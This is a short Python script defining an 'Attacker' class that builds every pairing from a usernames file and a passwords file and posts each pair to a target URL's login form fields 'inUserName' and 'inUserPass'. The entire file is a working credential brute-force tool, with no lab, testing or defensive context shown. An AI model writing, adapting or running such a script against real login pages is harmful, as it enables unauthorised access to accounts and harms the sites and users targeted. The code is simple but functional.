import itertools
import requests


class Attacker:
    def __init__(self, url):
        self.url = url

    @staticmethod
    def create_user_and_pass_combinations():
        with open('usernames.txt', 'r') as usernames_file:
            usernames = usernames_file.read()
            usernames_list = usernames.splitlines()
        with open('passwords.txt', 'r') as passwords_file:
            passwords = passwords_file.read()
            passwords_list = passwords.splitlines()

        combinations_list = list(itertools.product(usernames_list, passwords_list))
        return combinations_list

    def attack(self):
        combinations_list = Attacker.create_user_and_pass_combinations()
        for combination in combinations_list:
            username = combination[0]
            password = combination[1]
            print(f'username: {username}, password: {password}')
            payload = {'inUserName': username, 'inUserPass': password}
            requests.post(self.url, data=payload)
